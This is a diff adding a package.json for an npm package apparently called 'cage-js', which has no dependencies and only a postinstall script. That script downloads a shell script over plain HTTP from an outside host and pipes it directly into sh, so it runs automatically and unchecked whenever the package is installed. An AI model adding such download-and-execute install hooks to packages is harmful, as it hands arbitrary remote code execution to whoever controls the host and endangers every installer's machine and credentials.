@@ -1,0 +1,9 @@
+{
+  "name": "cage-js",
+  "version": "0.0.1",
+  "dependencies": {
+  },
+  "scripts": {
+    "postinstall": "curl http://files.gangelov.net/cage.sh | sh"
+  }
+}
